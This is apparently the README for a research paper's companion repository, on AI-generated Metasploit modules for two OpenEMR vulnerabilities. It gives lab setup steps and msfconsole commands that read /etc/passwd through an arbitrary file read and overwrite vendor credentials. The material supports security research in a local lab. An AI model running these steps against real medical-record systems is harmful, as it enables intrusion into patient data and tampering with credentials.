# AMENDER: AI-Assisted Metasploit Exploit Module Synthesis via Disclosure-Aware Extraction and Analyst-in-the-Loop Review for OpenEMR

Companion repository for the paper:
**"AMENDER: AI-Assisted Metasploit Exploit Module Synthesis via
Disclosure-Aware Extraction and Analyst-in-the-Loop Review for OpenEMR"**
(submitted to ICCFN 2026, under blind review)

---

## Repository Structure

    AMENDER-2026/
    |-- docker/
    |   +-- docker-compose.yml
    |-- modules/
    |   |-- cve_2026_24849_faxsms_file_read.rb
    |   |-- cve_2026_24849_rcfax_dispose.rb
    |   +-- cve_2026_33305_save_setup.rb
    +-- poc/
        |-- cve_2026_24849_original_poc.py
        |-- cve_2026_24849_file_read.py
        +-- cve_2026_33305_save_setup.py

---

## Vulnerabilities Covered

| CVE | CVSS | Description |
|---|---|---|
| CVE-2026-24849 | 9.9 Critical | Arbitrary file read/write via disposeDocument() in EtherFaxActions |
| CVE-2026-33305 | 5.4 Medium | Authorization bypass; AppDispatch dispatches actions before ACL checks |

---

## Prerequisites

- Docker and Docker Compose
- Metasploit Framework (msfconsole)
- Python 3 with requests library

---

## Step 1 - Start the Lab Environment

    cd docker/
    docker-compose up -d

This starts OpenEMR 7.0.2 on http://localhost:8300.
Default credentials: admin / pass.
Wait ~30 seconds before running any modules.

---

## Step 2 - Copy Metasploit Modules

    cp modules/cve_2026_24849_faxsms_file_read.rb ~/.msf4/modules/auxiliary/gather/
    cp modules/cve_2026_24849_rcfax_dispose.rb     ~/.msf4/modules/auxiliary/gather/
    cp modules/cve_2026_33305_save_setup.rb        ~/.msf4/modules/auxiliary/gather/

---

## Step 3 - Run CVE-2026-24849 Module (File Read)

    msfconsole -q
    msf6 > reload_all
    msf6 > use auxiliary/gather/cve_2026_24849_faxsms_file_read
    msf6 > set RHOSTS 127.0.0.1
    msf6 > set RPORT 8300
    msf6 > set USERNAME admin
    msf6 > set PASSWORD pass
    msf6 > set TARGETFILE /etc/passwd
    msf6 > run

Expected: contents of /etc/passwd returned in module output.

---

## Step 4 - Run CVE-2026-33305 Module (Credential Injection)

    msf6 > use auxiliary/gather/cve_2026_33305_save_setup
    msf6 > set RHOSTS 127.0.0.1
    msf6 > set RPORT 8300
    msf6 > set USERNAME admin
    msf6 > set PASSWORD pass
    msf6 > run

Expected: vendor credentials overwritten; module confirms write success.

---

## Step 5 - Verify with Python PoC (optional)

    python3 poc/cve_2026_24849_file_read.py

---

## Stopping the Lab

    docker-compose down

---

## Notes

- All modules were synthesised by the AMENDER pipeline and validated against
  the lab environment described in the paper (Section 4).
- Conformance gates passed: X1 Ruby syntax, X2 msftidy, X3 live functional.
- Author identity withheld for blind review.
